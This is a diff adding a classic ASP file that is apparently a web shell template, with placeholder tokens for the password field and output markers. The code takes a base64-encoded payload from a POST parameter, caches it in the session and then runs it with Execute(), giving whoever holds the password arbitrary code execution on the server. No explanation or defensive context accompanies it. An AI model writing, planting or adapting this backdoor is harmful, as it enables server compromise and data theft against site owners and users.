@@ -1,0 +1,56 @@
+<%
+Set bypassDictionary = Server.CreateObject("Scripting.Dictionary")
+
+Function Base64Decode(ByVal vCode)
+    Dim oXML, oNode
+    Set oXML = CreateObject("Msxml2.DOMDocument.3.0")
+    Set oNode = oXML.CreateElement("base64")
+    oNode.dataType = "bin.base64"
+    oNode.text = vCode
+    Base64Decode = oNode.nodeTypedValue
+    Set oNode = Nothing
+    Set oXML = Nothing
+End Function
+
+Function decryption(content,isBin)
+    dim size,i,result,keySize
+    keySize = len(key)
+    Set BinaryStream = CreateObject("ADODB.Stream")
+    BinaryStream.CharSet = "iso-8859-1"
+    BinaryStream.Type = 2
+    BinaryStream.Open
+    if IsArray(content) then
+        size=UBound(content)+1
+        For i=1 To size
+            BinaryStream.WriteText chrw(ascb(midb(content,i,1)))
+        Next
+    end if
+    BinaryStream.Position = 0
+    if isBin then
+        BinaryStream.Type = 1
+        decryption=BinaryStream.Read()
+    else
+        decryption=BinaryStream.ReadText()
+    end if
+
+End Function
+    content=request.Form("{pass}")
+    if not IsEmpty(content) then
+
+        if  IsEmpty(Session("payload")) then
+            content=decryption(Base64Decode(content),false)
+            Session("payload")=content
+            response.End
+        else
+            content=Base64Decode(content)
+            bypassDictionary.Add "payload",Session("payload")
+            Execute(bypassDictionary("payload"))
+            result=run(content)
+            response.Write("{findStrLeft}")
+            if not IsEmpty(result) then
+                response.Write Base64Encode(decryption(result,true))
+            end if
+            response.Write("{findStrRight}")
+        end if
+    end if
+%>
